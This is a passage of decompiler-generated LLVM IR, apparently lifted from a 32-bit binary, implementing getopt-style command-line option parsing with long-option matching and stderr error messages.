  %stack_var_-24.040 = phi i32 [ 0, %dec_label_pc_80604a6.lr.ph ], [ %v4_8060513, %dec_label_pc_8060513.dec_label_pc_80604a6_crit_edge ]
  %stack_var_-52.139 = phi i32 [ -1, %dec_label_pc_80604a6.lr.ph ], [ %stack_var_-52.0, %dec_label_pc_8060513.dec_label_pc_80604a6_crit_edge ]
  %v0_8060503 = phi i32 [ 0, %dec_label_pc_80604a6.lr.ph ], [ %stack_var_-20.0, %dec_label_pc_8060513.dec_label_pc_80604a6_crit_edge ]
  %stack_var_-48.137 = phi i32 [ 0, %dec_label_pc_80604a6.lr.ph ], [ %stack_var_-48.0, %dec_label_pc_8060513.dec_label_pc_80604a6_crit_edge ]
  %v6_80604a8 = sub i32 %v0_80604a6, %v1_806046b
  store i32 %v6_80604a8, i32* @ebp, align 4
  %v0_80604ac = load i32, i32* @ecx, align 4
  %v5_80604b2 = inttoptr i32 %v2_806051a41 to i8*
  %v6_80604b3 = call i32 @__GI_strncmp(i8* %v5_80604b2, i32 %v1_806046b, i32 %v0_80604ac)
  store i32 %v6_80604b3, i32* @eax, align 4
  %v1_80604bb = icmp eq i32 %v6_80604b3, 0
  %v1_80604bd = icmp eq i1 %v1_80604bb, false
  br i1 %v1_80604bd, label %dec_label_pc_8060513, label %dec_label_pc_80604bf

dec_label_pc_80604bf:                             ; preds = %dec_label_pc_80604a6
  %v3_80604c3 = call i32 @strlen(i8* %v5_80604b2)
  store i32 %v3_80604c3, i32* @eax, align 4
  %v0_80604cb = load i32, i32* @ebp, align 4
  %v12_80604cb = icmp eq i32 %v0_80604cb, %v3_80604c3
  br i1 %v12_80604cb, label %dec_label_pc_80603f3, label %dec_label_pc_80604d3

dec_label_pc_80604d3:                             ; preds = %dec_label_pc_80604bf
  %v4_80604d3 = icmp eq i32 %v0_8060503, 0
  %v1_80604d8 = icmp eq i1 %v4_80604d3, false
  br i1 %v1_80604d8, label %dec_label_pc_80604e8, label %dec_label_pc_80604da

dec_label_pc_80604da:                             ; preds = %dec_label_pc_80604d3
  store i32 %stack_var_-24.040, i32* @ecx, align 4
  %v0_80604de = load i32, i32* @esi, align 4
  br label %dec_label_pc_8060513

dec_label_pc_80604e8:                             ; preds = %dec_label_pc_80604d3
  br i1 %v1_80604ed, label %dec_label_pc_806050b, label %dec_label_pc_80604ef

dec_label_pc_80604ef:                             ; preds = %dec_label_pc_80604e8
  store i32 %v0_8060503, i32* @edx, align 4
  %v1_80604f3 = add i32 %v0_8060503, 4
  %v2_80604f3 = inttoptr i32 %v1_80604f3 to i32*
  %v3_80604f3 = load i32, i32* %v2_80604f3, align 4
  store i32 %v3_80604f3, i32* @eax, align 4
  %v1_80604f6 = load i32, i32* @esi, align 4
  %v2_80604f6 = add i32 %v1_80604f6, 4
  %v3_80604f6 = inttoptr i32 %v2_80604f6 to i32*
  %v4_80604f6 = load i32, i32* %v3_80604f6, align 4
  %v15_80604f6 = icmp eq i32 %v3_80604f3, %v4_80604f6
  %v1_80604f9 = icmp eq i1 %v15_80604f6, false
  br i1 %v1_80604f9, label %dec_label_pc_806050b, label %dec_label_pc_80604fb

dec_label_pc_80604fb:                             ; preds = %dec_label_pc_80604ef
  %v1_80604fb = add i32 %v0_8060503, 8
  %v2_80604fb = inttoptr i32 %v1_80604fb to i32*
  %v3_80604fb = load i32, i32* %v2_80604fb, align 4
  store i32 %v3_80604fb, i32* @eax, align 4
  %v2_80604fe = add i32 %v1_80604f6, 8
  %v3_80604fe = inttoptr i32 %v2_80604fe to i32*
  %v4_80604fe = load i32, i32* %v3_80604fe, align 4
  %v15_80604fe = icmp eq i32 %v3_80604fb, %v4_80604fe
  %v1_8060501 = icmp eq i1 %v15_80604fe, false
  br i1 %v1_8060501, label %dec_label_pc_806050b, label %dec_label_pc_8060503

dec_label_pc_8060503:                             ; preds = %dec_label_pc_80604fb
  %v1_8060503 = add i32 %v0_8060503, 12
  %v2_8060503 = inttoptr i32 %v1_8060503 to i32*
  %v3_8060503 = load i32, i32* %v2_8060503, align 4
  store i32 %v3_8060503, i32* @eax, align 4
  %v2_8060506 = add i32 %v1_80604f6, 12
  %v3_8060506 = inttoptr i32 %v2_8060506 to i32*
  %v4_8060506 = load i32, i32* %v3_8060506, align 4
  %v15_8060506 = icmp eq i32 %v3_8060503, %v4_8060506
  br i1 %v15_8060506, label %dec_label_pc_8060513, label %dec_label_pc_806050b

dec_label_pc_806050b:                             ; preds = %dec_label_pc_8060503, %dec_label_pc_80604fb, %dec_label_pc_80604ef, %dec_label_pc_80604e8
  br label %dec_label_pc_8060513

dec_label_pc_8060513:                             ; preds = %dec_label_pc_8060503, %dec_label_pc_80604a6, %dec_label_pc_80604da, %dec_label_pc_806050b
  %stack_var_-48.0 = phi i32 [ %stack_var_-48.137, %dec_label_pc_80604a6 ], [ 1, %dec_label_pc_806050b ], [ %stack_var_-48.137, %dec_label_pc_8060503 ], [ %stack_var_-48.137, %dec_label_pc_80604da ]
  %stack_var_-20.0 = phi i32 [ %v0_8060503, %dec_label_pc_80604a6 ], [ %v0_8060503, %dec_label_pc_806050b ], [ %v0_8060503, %dec_label_pc_8060503 ], [ %v0_80604de, %dec_label_pc_80604da ]
  %stack_var_-52.0 = phi i32 [ %stack_var_-52.139, %dec_label_pc_80604a6 ], [ %stack_var_-52.139, %dec_label_pc_806050b ], [ %stack_var_-52.139, %dec_label_pc_8060503 ], [ %stack_var_-24.040, %dec_label_pc_80604da ]
  %v0_8060517 = load i32, i32* @esi, align 4
  %v1_8060517 = add i32 %v0_8060517, 16
  store i32 %v1_8060517, i32* @esi, align 4
  %v1_806051a = inttoptr i32 %v1_8060517 to i32*
  %v2_806051a = load i32, i32* %v1_806051a, align 4
  store i32 %v2_806051a, i32* @ebx, align 4
  %v1_806051c = icmp eq i32 %v2_806051a, 0
  %v1_806051e = icmp eq i1 %v1_806051c, false
  br i1 %v1_806051e, label %dec_label_pc_8060513.dec_label_pc_80604a6_crit_edge, label %dec_label_pc_8060520

dec_label_pc_8060513.dec_label_pc_80604a6_crit_edge: ; preds = %dec_label_pc_8060513
  %v4_8060513 = add i32 %stack_var_-24.040, 1
  %v0_80604a6.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80604a6

dec_label_pc_8060520:                             ; preds = %dec_label_pc_8060513, %dec_label_pc_806051a.preheader
  %stack_var_-48.1.lcssa = phi i32 [ 0, %dec_label_pc_806051a.preheader ], [ %stack_var_-48.0, %dec_label_pc_8060513 ]
  %stack_var_-20.1.lcssa = phi i32 [ 0, %dec_label_pc_806051a.preheader ], [ %stack_var_-20.0, %dec_label_pc_8060513 ]
  %stack_var_-52.1.lcssa = phi i32 [ -1, %dec_label_pc_806051a.preheader ], [ %stack_var_-52.0, %dec_label_pc_8060513 ]
  store i32 %stack_var_-20.1.lcssa, i32* @esi, align 4
  br label %dec_label_pc_8060526

dec_label_pc_8060526:                             ; preds = %dec_label_pc_80603f3, %dec_label_pc_8060520
  %stack_var_-48.125 = phi i32 [ %stack_var_-48.137, %dec_label_pc_80603f3 ], [ %stack_var_-48.1.lcssa, %dec_label_pc_8060520 ]
  %stack_var_-52.2 = phi i32 [ %stack_var_-24.040, %dec_label_pc_80603f3 ], [ %stack_var_-52.1.lcssa, %dec_label_pc_8060520 ]
  %v0_806052d = phi i32 [ 1, %dec_label_pc_80603f3 ], [ 0, %dec_label_pc_8060520 ]
  %v4_8060526 = icmp eq i32 %stack_var_-48.125, 0
  br i1 %v4_8060526, label %dec_label_pc_8060574, label %dec_label_pc_806052d

dec_label_pc_806052d:                             ; preds = %dec_label_pc_8060526
  %v1_806052d = icmp eq i32 %v0_806052d, 0
  %v1_806052f = icmp eq i1 %v1_806052d, false
  br i1 %v1_806052f, label %dec_label_pc_8060574, label %dec_label_pc_8060531

dec_label_pc_8060531:                             ; preds = %dec_label_pc_806052d
  %v4_8060531 = icmp eq i32 %v0_80601be., 0
  br i1 %v4_8060531, label %dec_label_pc_8060531.dec_label_pc_8060555_crit_edge, label %dec_label_pc_8060538

dec_label_pc_8060531.dec_label_pc_8060555_crit_edge: ; preds = %dec_label_pc_8060531
  br label %dec_label_pc_8060555

dec_label_pc_8060538:                             ; preds = %dec_label_pc_8060531
  store i32 %tmp94, i32* @ecx, align 4
  %v2_8060540 = load i32, i32* %arg2, align 4
  %v0_80605474 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v5_806054d = call i32 @fprintf(i32 %v0_80605474, i32 ptrtoint ([30 x i8]* @global_var_806db3b.811 to i32), i32 %v2_8060540)
  br label %dec_label_pc_8060555

dec_label_pc_8060555:                             ; preds = %dec_label_pc_8060531.dec_label_pc_8060555_crit_edge, %dec_label_pc_8060538
  %v0_8060558 = load i8*, i8** @global_var_807c8b8.807, align 4
  %v1_8060558 = ptrtoint i8* %v0_8060558 to i32
  %v3_806055f = call i32 @strlen(i8* %v0_8060558)
  %v2_8060567 = add i32 %v1_8060558, %v3_806055f
  %v1_8060569 = inttoptr i32 %v2_8060567 to i8*
  br label %dec_label_pc_8060766

dec_label_pc_8060574:                             ; preds = %dec_label_pc_806052d, %dec_label_pc_8060526
  %v0_8060574 = load i32, i32* @esi, align 4
  %v1_8060574 = icmp eq i32 %v0_8060574, 0
  br i1 %v1_8060574, label %dec_label_pc_80606df, label %dec_label_pc_806057c

dec_label_pc_806057c:                             ; preds = %dec_label_pc_8060574
  %v1_8060580 = add i32 %v0_806041e, 1
  store i32 %v1_8060580, i32* @global_var_807c8a8.801, align 8
  %v0_8060586 = load i32, i32* @edi, align 4
  %v1_8060586 = inttoptr i32 %v0_8060586 to i8*
  %v2_8060586 = load i8, i8* %v1_8060586, align 1
  %v3_8060586 = icmp eq i8 %v2_8060586, 0
  %v1_8060619 = add i32 %v0_8060574, 4
  %v2_8060619 = inttoptr i32 %v1_8060619 to i32*
  %v3_8060619 = load i32, i32* %v2_8060619, align 4
  br i1 %v3_8060586, label %dec_label_pc_8060619, label %dec_label_pc_806058f

dec_label_pc_806058f:                             ; preds = %dec_label_pc_806057c
  %v4_806058f = icmp eq i32 %v3_8060619, 0
  br i1 %v4_806058f, label %dec_label_pc_80605a2, label %dec_label_pc_8060595

dec_label_pc_8060595:                             ; preds = %dec_label_pc_806058f
  %v1_8060595 = add i32 %v0_8060586, 1
  store i32 %v1_8060595, i32* @global_var_807c8b0.802, align 16
  br label %dec_label_pc_806069a

dec_label_pc_80605a2:                             ; preds = %dec_label_pc_806058f
  %v4_80605a2 = icmp eq i32 %v0_80601be., 0
  br i1 %v4_80605a2, label %dec_label_pc_80605a2.dec_label_pc_80605f2_crit_edge, label %dec_label_pc_80605a9

dec_label_pc_80605a2.dec_label_pc_80605f2_crit_edge: ; preds = %dec_label_pc_80605a2
  br label %dec_label_pc_80605f2

dec_label_pc_80605a9:                             ; preds = %dec_label_pc_80605a2
  store i32 %tmp94, i32* @edx, align 4
  %v2_80605ad = mul i32 %v1_8060580, 4
  %v3_80605ad = add i32 %tmp94, -4
  %v4_80605ad = add i32 %v3_80605ad, %v2_80605ad
  %v5_80605ad = inttoptr i32 %v4_80605ad to i32*
  %v6_80605ad = load i32, i32* %v5_80605ad, align 4
  %v1_80605b1 = add i32 %v6_80605ad, 1
  %v2_80605b1 = inttoptr i32 %v1_80605b1 to i8*
  %v3_80605b1 = load i8, i8* %v2_80605b1, align 1
  %v12_80605b1 = icmp eq i8 %v3_80605b1, 45
  %v1_80605b5 = icmp eq i1 %v12_80605b1, false
  br i1 %v1_80605b5, label %dec_label_pc_80605d0, label %dec_label_pc_80605b7

dec_label_pc_80605b7:                             ; preds = %dec_label_pc_80605a9
  %v2_80605b9 = load i32, i32* %arg2, align 4
  %v0_80605c06 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v5_80605c6 = call i32 @fprintf(i32 %v0_80605c06, i32 ptrtoint ([45 x i8]* @global_var_806db59.812 to i32), i32 %v2_80605b9)
  br label %dec_label_pc_80605f2

dec_label_pc_80605d0:                             ; preds = %dec_label_pc_80605a9
  store i32 %tmp94, i32* @ecx, align 4
  %v2_80605dd = load i32, i32* %arg2, align 4
  %v0_80605e47 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v5_80605ea = call i32 @fprintf(i32 %v0_80605e47, i32 ptrtoint ([45 x i8]* @global_var_806db86.813 to i32), i32 %v2_80605dd)
  br label %dec_label_pc_80605f2

dec_label_pc_80605f2:                             ; preds = %dec_label_pc_80605a2.dec_label_pc_80605f2_crit_edge, %dec_label_pc_80605b7, %dec_label_pc_80605d0
  %v0_80605f5 = load i8*, i8** @global_var_807c8b8.807, align 4
  %v1_80605f5 = ptrtoint i8* %v0_80605f5 to i32
  %v3_80605fc = call i32 @strlen(i8* %v0_80605f5)
  %v2_8060601 = add i32 %v1_80605f5, %v3_80605fc
  %v1_8060606 = inttoptr i32 %v2_8060601 to i8*
  store i8* %v1_8060606, i8** @global_var_807c8b8.807, align 8
  %v0_806060c = load i32, i32* @esi, align 4
  %v1_806060c = add i32 %v0_806060c, 12
  %v2_806060c = inttoptr i32 %v1_806060c to i32*
  %v3_806060c = load i32, i32* %v2_806060c, align 4
  %v1_806060f = trunc i32 %v3_806060c to i8
  store i8 %v1_806060f, i8* @global_var_807c8b4.814, align 4
  br label %dec_label_pc_80607fb

dec_label_pc_8060619:                             ; preds = %dec_label_pc_806057c
  %v12_8060619 = icmp eq i32 %v3_8060619, 1
  %v1_806061d = icmp eq i1 %v12_8060619, false
  br i1 %v1_806061d, label %dec_label_pc_806069a, label %dec_label_pc_806061f

dec_label_pc_806061f:                             ; preds = %dec_label_pc_8060619
  %v5_8060623 = icmp slt i32 %v1_8060580, %arg1
  br i1 %v5_8060623, label %dec_label_pc_8060625, label %dec_label_pc_806063f

dec_label_pc_8060625:                             ; preds = %dec_label_pc_806061f
  %v2_8060629 = mul i32 %v1_8060580, 4
  %v3_8060629 = add i32 %v2_8060629, %tmp94
  %v4_8060629 = inttoptr i32 %v3_8060629 to i32*
  %v5_8060629 = load i32, i32* %v4_8060629, align 4
  store i32 %v5_8060629, i32* @global_var_807c8b0.802, align 16
  %v1_8060635 = add i32 %v0_806041e, 2
  store i32 %v1_8060635, i32* @global_var_807c8a8.801, align 8
  br label %dec_label_pc_806069a

dec_label_pc_806063f:                             ; preds = %dec_label_pc_806061f
  %v4_806063f = icmp eq i32 %v0_80601be., 0
  br i1 %v4_806063f, label %dec_label_pc_806063f.dec_label_pc_8060663_crit_edge, label %dec_label_pc_8060646

dec_label_pc_806063f.dec_label_pc_8060663_crit_edge: ; preds = %dec_label_pc_806063f
  br label %dec_label_pc_8060663

dec_label_pc_8060646:                             ; preds = %dec_label_pc_806063f
  store i32 %tmp94, i32* @ecx, align 4
  %v2_806064e = load i32, i32* %arg2, align 4
  %v0_80606558 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v5_806065b = call i32 @fprintf(i32 %v0_80606558, i32 ptrtoint ([38 x i8]* @global_var_806dbb3.815 to i32), i32 %v2_806064e)
  br label %dec_label_pc_8060663

dec_label_pc_8060663:                             ; preds = %dec_label_pc_806063f.dec_label_pc_8060663_crit_edge, %dec_label_pc_8060646
  %v0_8060666 = load i8*, i8** @global_var_807c8b8.807, align 4
  %v1_8060666 = ptrtoint i8* %v0_8060666 to i32
  %v3_806066d = call i32 @strlen(i8* %v0_8060666)
  %v2_8060672 = add i32 %v1_8060666, %v3_806066d
  %v1_8060677 = inttoptr i32 %v2_8060672 to i8*
  store i8* %v1_8060677, i8** @global_var_807c8b8.807, align 8
  %v0_806067f = load i32, i32* @esi, align 4
  %v1_806067f = add i32 %v0_806067f, 12
  %v2_806067f = inttoptr i32 %v1_806067f to i32*
  %v3_806067f = load i32, i32* %v2_806067f, align 4
  %v1_8060682 = trunc i32 %v3_806067f to i8
  store i8 %v1_8060682, i8* @global_var_807c8b4.814, align 4
  %v2_806068b = load i8, i8* %v3_8060687, align 1
  %v11_806068b = icmp eq i8 %v2_806068b, 58
  %v1_806068e = icmp eq i1 %v11_806068b, false
  %v2_806068e = zext i1 %v1_806068e to i32
  %v3_8060691 = select i1 %v1_806068e, i32 62, i32 58
  %v4_8060691 = or i32 %v3_8060691, %v2_806068e
  br label %dec_label_pc_80608aa

dec_label_pc_806069a:                             ; preds = %dec_label_pc_8060619, %dec_label_pc_8060625, %dec_label_pc_8060595
  %v0_806069d = load i8*, i8** @global_var_807c8b8.807, align 4
  %v1_806069d = ptrtoint i8* %v0_806069d to i32
  %v3_80606a4 = call i32 @strlen(i8* %v0_806069d)
  %v2_80606ac = add i32 %v1_806069d, %v3_80606a4
  %v1_80606ae = inttoptr i32 %v2_80606ac to i8*
  store i8* %v1_80606ae, i8** @global_var_807c8b8.807, align 8
  %v4_80606b4 = icmp eq i32 %arg5, 0
  br i1 %v4_80606b4, label %dec_label_pc_80606c5, label %dec_label_pc_80606bb

dec_label_pc_80606bb:                             ; preds = %dec_label_pc_806069a
  store i32 %stack_var_-52.2, i32* @ecx, align 4
  %v2_80606c3 = inttoptr i32 %arg5 to i32*
  store i32 %stack_var_-52.2, i32* %v2_80606c3, align 4
  br label %dec_label_pc_80606c5

dec_label_pc_80606c5:                             ; preds = %dec_label_pc_806069a, %dec_label_pc_80606bb
  %v0_80606c5 = load i32, i32* @esi, align 4
  %v1_80606c5 = add i32 %v0_80606c5, 8
  %v2_80606c5 = inttoptr i32 %v1_80606c5 to i32*
  %v3_80606c5 = load i32, i32* %v2_80606c5, align 4
  %v1_80606c8 = add i32 %v0_80606c5, 12
  %v2_80606c8 = inttoptr i32 %v1_80606c8 to i32*
  %v3_80606c8 = load i32, i32* %v2_80606c8, align 4
  %v1_80606cb = icmp eq i32 %v3_80606c5, 0
  br i1 %v1_80606cb, label %dec_label_pc_80606d8, label %dec_label_pc_80606cf

dec_label_pc_80606cf:                             ; preds = %dec_label_pc_80606c5
  %v2_80606cf = inttoptr i32 %v3_80606c5 to i32*
  store i32 %v3_80606c8, i32* %v2_80606cf, align 4
  br label %dec_label_pc_80608aa

dec_label_pc_80606d8:                             ; preds = %dec_label_pc_80606c5
  br label %dec_label_pc_80608aa

dec_label_pc_80606df:                             ; preds = %dec_label_pc_8060574
  %v4_80606df = icmp eq i32 %arg6, 0
  br i1 %v4_80606df, label %dec_label_pc_8060707, label %dec_label_pc_80606e6

dec_label_pc_80606e6:                             ; preds = %dec_label_pc_80606df
  br i1 %v10_806043a, label %dec_label_pc_8060707, label %dec_label_pc_80606ed

dec_label_pc_80606ed:                             ; preds = %dec_label_pc_80606e6
  store i32 %v1_806046b, i32* @edx, align 4
  %v2_80606f3 = load i8, i8* %v3_8060715, align 1
  %v3_80606f3 = sext i8 %v2_80606f3 to i32
  %v0_80606fb.cast = inttoptr i32 %v3_806079113 to i8*
  %v5_80606fb = call i32 @__GI_strchr(i8* %v0_80606fb.cast, i32 %v3_80606f3)
  %v1_8060703 = icmp eq i32 %v5_80606fb, 0
  %v1_8060705 = icmp eq i1 %v1_8060703, false
  br i1 %v1_8060705, label %dec_label_pc_8060778, label %dec_label_pc_8060707

dec_label_pc_8060707:                             ; preds = %dec_label_pc_80606ed, %dec_label_pc_80606e6, %dec_label_pc_80606df
  %v4_8060707 = icmp eq i32 %v0_80601be., 0
  br i1 %v4_8060707, label %dec_label_pc_8060766, label %dec_label_pc_806070e

dec_label_pc_806070e:                             ; preds = %dec_label_pc_8060707
  %v1_8060713 = icmp eq i1 %v10_806043a, false
  br i1 %v1_8060713, label %dec_label_pc_8060734, label %dec_label_pc_8060715

dec_label_pc_8060715:                             ; preds = %dec_label_pc_806070e
  store i32 %tmp94, i32* @ecx, align 4
  %v2_806071d = load i32, i32* %arg2, align 4
  %v0_806072410 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v5_806072a = call i32 @fprintf(i32 %v0_806072410, i32 ptrtoint ([32 x i8]* @global_var_806dbd9.816 to i32), i32 %v2_806071d)
  br label %dec_label_pc_8060766

dec_label_pc_8060734:                             ; preds = %dec_label_pc_806070e
  store i32 %v5_806042c, i32* @edx, align 4
  store i32 %tmp94, i32* @ecx, align 4
  %v2_8060747 = load i32, i32* %arg2, align 4
  %v0_806074e12 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v5_8060754 = call i32 @fprintf(i32 %v0_806074e12, i32 ptrtoint ([32 x i8]* @global_var_806dbf9.817 to i32), i32 %v2_8060747)
  br label %dec_label_pc_8060766

dec_label_pc_8060766:                             ; preds = %dec_label_pc_8060734, %dec_label_pc_8060715, %dec_label_pc_8060707, %dec_label_pc_8060555
  %storemerge5 = phi i8* [ %v1_8060569, %dec_label_pc_8060555 ], [ bitcast (i32* @global_var_806e71b.818 to i8*), %dec_label_pc_8060707 ], [ bitcast (i32* @global_var_806e71b.818 to i8*), %dec_label_pc_8060715 ], [ bitcast (i32* @global_var_806e71b.818 to i8*), %dec_label_pc_8060734 ]
  store i8* %storemerge5, i8** @global_var_807c8b8.807, align 8
  %v0_8060766 = load i32, i32* @global_var_807c8a8.801, align 8
  %v1_8060766 = add i32 %v0_8060766, 1
  store i32 %v1_8060766, i32* @global_var_807c8a8.801, align 8
  store i8 0, i8* @global_var_807c8b4.814, align 4
  br label %dec_label_pc_80607fb

dec_label_pc_8060778:                             ; preds = %dec_label_pc_80606ed, %dec_label_pc_806044f, %dec_label_pc_806043e, %dec_label_pc_8060416
  %v0_8060778 = load i8*, i8** @global_var_807c8b8.807, align 4
  %v1_8060778 = ptrtoint i8* %v0_8060778 to i32
  store i32 %v1_8060778, i32* @ebx, align 4
  %v2_806077e = load i8, i8* %v0_8060778, align 1
  %v3_806077e = zext i8 %v2_806077e to i32
  store i32 %v3_806077e, i32* @edi, align 4
  %v1_8060781 = add i32 %v1_8060778, 1
  %v1_8060784 = inttoptr i32 %v1_8060781 to i8*
  store i8* %v1_8060784, i8** @global_var_807c8b8.807, align 8
  %v2_806078b = sext i8 %v2_806077e to i32
  store i32 %v2_806078b, i32* @esi, align 4
  %v0_8060795.cast = inttoptr i32 %v3_806079113 to i8*
  %v5_8060795 = call i32 @__GI_strchr(i8* %v0_8060795.cast, i32 %v2_806078b)
  %v0_806079d = load i32, i32* @ebx, align 4
  %v1_806079d = add i32 %v0_806079d, 1
  %v2_806079d = inttoptr i32 %v1_806079d to i8*
  %v3_806079d = load i8, i8* %v2_806079d, align 1
  %v8_806079d = icmp eq i8 %v3_806079d, 0
  store i32 %v5_8060795, i32* @edx, align 4
  %v0_80607a3 = load i32, i32* @global_var_807c8a8.801, align 8
  %v2_80607a8 = zext i1 %v8_806079d to i32
  %v3_80607a8 = add i32 %v2_80607a8, %v0_80607a3
  %v1_80607ab = icmp eq i32 %v5_8060795, 0
  store i32 %v3_80607a8, i32* @global_var_807c8a8.801, align 8
  br i1 %v1_80607ab, label %dec_label_pc_80607bb, label %dec_label_pc_80607b4

dec_label_pc_80607b4:                             ; preds = %dec_label_pc_8060778
  %v0_80607b4 = load i32, i32* @edi, align 4
  store i32 %v0_80607b4, i32* @ecx, align 4
  %v1_80607b6 = trunc i32 %v0_80607b4 to i8
  %v10_80607b6 = icmp eq i8 %v1_80607b6, 58
  %v1_80607b9 = icmp eq i1 %v10_80607b6, false
  br i1 %v1_80607b9, label %dec_label_pc_8060805, label %dec_label_pc_80607bb

dec_label_pc_80607bb:                             ; preds = %dec_label_pc_80607b4, %dec_label_pc_8060778
  %v4_80607bb = icmp eq i32 %v0_80601be., 0
  br i1 %v4_80607bb, label %dec_label_pc_80607f3, label %dec_label_pc_80607c2

dec_label_pc_80607c2:                             ; preds = %dec_label_pc_80607bb
  %v0_80607c2 = load i8, i8* @global_var_807c8b7.808, align 1
  %v1_80607c2 = icmp eq i8 %v0_80607c2, 0
  br i1 %v1_80607c2, label %dec_label_pc_80607d9, label %dec_label_pc_80607cb

dec_label_pc_80607cb:                             ; preds = %dec_label_pc_80607c2
  br label %dec_label_pc_80607e5

dec_label_pc_80607d9:                             ; preds = %dec_label_pc_80607c2
  store i32 %tmp94, i32* @edx, align 4
  br label %dec_label_pc_80607e5

dec_label_pc_80607e5:                             ; preds = %dec_label_pc_80607cb, %dec_label_pc_80607d9
  %storemerge18 = phi i8* [ getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_806dc19.819, i32 0, i32 0), %dec_label_pc_80607cb ], [ getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_806dc33.820, i32 0, i32 0), %dec_label_pc_80607d9 ]
  %storemerge20 = load i32, i32* %arg2, align 4
  %v0_80607e515 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v3_80607eb = ptrtoint i8* %storemerge18 to i32
  %v5_80607eb = call i32 @fprintf(i32 %v0_80607e515, i32 %v3_80607eb, i32 %storemerge20)
  br label %dec_label_pc_80607f3

dec_label_pc_80607f3:                             ; preds = %dec_label_pc_80607bb, %dec_label_pc_80607e5
  %v0_80607f3 = load i32, i32* @edi, align 4
  store i32 %v0_80607f3, i32* @ecx, align 4
  %v1_80607f5 = trunc i32 %v0_80607f3 to i8
  store i8 %v1_80607f5, i8* @global_var_807c8b4.814, align 4
  br label %dec_label_pc_80607fb

dec_label_pc_80607fb:                             ; preds = %dec_label_pc_8060766, %dec_label_pc_80605f2, %dec_label_pc_80607f3
  br label %dec_label_pc_80608aa

dec_label_pc_8060805:                             ; preds = %dec_label_pc_80607b4
  %v1_8060805 = add i32 %v5_8060795, 1
  %v2_8060805 = inttoptr i32 %v1_8060805 to i8*
  %v3_8060805 = load i8, i8* %v2_8060805, align 1
  %v12_8060805 = icmp eq i8 %v3_8060805, 58
  %v1_8060809 = icmp eq i1 %v12_8060805, false
  br i1 %v1_8060809, label %dec_label_pc_80608a0, label %dec_label_pc_806080f

dec_label_pc_806080f:                             ; preds = %dec_label_pc_8060805
  %v1_806080f = add i32 %v5_8060795, 2
  %v2_806080f = inttoptr i32 %v1_806080f to i8*
  %v3_806080f = load i8, i8* %v2_806080f, align 1
  %v12_806080f = icmp eq i8 %v3_806080f, 58
  %v0_8060813 = load i8*, i8** @global_var_807c8b8.807, align 4
  %v1_8060813 = ptrtoint i8* %v0_8060813 to i32
  %v1_8060818 = icmp eq i1 %v12_806080f, false
  %v2_806082b = load i8, i8* %v0_8060813, align 1
  %v3_806082b = icmp eq i8 %v2_806082b, 0
  br i1 %v1_8060818, label %dec_label_pc_806082b, label %dec_label_pc_806081a

dec_label_pc_806081a:                             ; preds = %dec_label_pc_806080f
  %v1_806081d = icmp eq i1 %v3_806082b, false
  br i1 %v1_806081d, label %dec_label_pc_8060830, label %dec_label_pc_806081f

dec_label_pc_806081f:                             ; preds = %dec_label_pc_806081a
  store i32 0, i32* @global_var_807c8b0.802, align 16
  br label %dec_label_pc_8060896

dec_label_pc_806082b:                             ; preds = %dec_label_pc_806080f
  br i1 %v3_806082b, label %dec_label_pc_806083d, label %dec_label_pc_8060830

dec_label_pc_8060830:                             ; preds = %dec_label_pc_806082b, %dec_label_pc_806081a
  %v1_8060830 = add i32 %v3_80607a8, 1
  store i32 %v1_8060830, i32* @global_var_807c8a8.801, align 8
  store i32 %v1_8060813, i32* @global_var_807c8b0.802, align 16
  br label %dec_label_pc_8060896

dec_label_pc_806083d:                             ; preds = %dec_label_pc_806082b
  store i32 %v3_80607a8, i32* @edx, align 4
  %v15_8060843 = icmp eq i32 %v3_80607a8, %arg1
  %v1_8060847 = icmp eq i1 %v15_8060843, false
  br i1 %v1_8060847, label %dec_label_pc_8060882, label %dec_label_pc_8060849

dec_label_pc_8060849:                             ; preds = %dec_label_pc_806083d
  %v4_8060849 = icmp eq i32 %v0_80601be., 0
  br i1 %v4_8060849, label %dec_label_pc_806086a, label %dec_label_pc_8060850

dec_label_pc_8060850:                             ; preds = %dec_label_pc_8060849
  %v2_8060855 = load i32, i32* %arg2, align 4
  %v0_806085c16 = load i32, i32* bitcast (i8** @global_var_8073d70 to i32*), align 4
  %v5_8060862 = call i32 @fprintf(i32 %v0_806085c16, i32 ptrtoint ([39 x i8]* @global_var_806dc4d.821 to i32), i32 %v2_8060855)
  %v0_806086a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_806086a

dec_label_pc_806086a:                             ; preds = %dec_label_pc_8060849, %dec_label_pc_8060850
  %v3_8060879 = phi i32 [ %v1_8060813, %dec_label_pc_8060849 ], [ %v5_8060862, %dec_label_pc_8060850 ]
  %v0_806086a = phi i32 [ %v0_80607b4, %dec_label_pc_8060849 ], [ %v0_806086a.pre, %dec_label_pc_8060850 ]
  store i32 %v3_806079113, i32* @ecx, align 4
  %v1_8060870 = trunc i32 %v0_806086a to i8
  store i8 %v1_8060870, i8* @global_var_807c8b4.814, align 4
  %v2_8060876 = load i8, i8* %v0_8060795.cast, align 1
  %v11_8060876 = icmp eq i8 %v2_8060876, 58
  %v1_8060879 = icmp eq i1 %v11_8060876, false
  %v2_8060879 = zext i1 %v1_8060879 to i32
  %v4_8060879 = and i32 %v3_8060879, -256
  %v5_8060879 = or i32 %v2_8060879, %v4_8060879
  %v2_806087c = mul i32 %v5_8060879, 4
  %v3_806087c = or i32 %v5_8060879, 58
  %v4_806087c = add i32 %v3_806087c, %v2_806087c
  br label %dec_label_pc_8060896

dec_label_pc_8060882:                             ; preds = %dec_label_pc_806083d
  store i32 %tmp94, i32* @ecx, align 4
  %v2_8060886 = mul i32 %v3_80607a8, 4
  %v3_8060886 = add i32 %v2_8060886, %tmp94
  %v4_8060886 = inttoptr i32 %v3_8060886 to i32*
  %v5_8060886 = load i32, i32* %v4_8060886, align 4
  store i32 %v5_8060886, i32* @global_var_807c8b0.802, align 16
  %v1_806088e = add i32 %v3_80607a8, 1
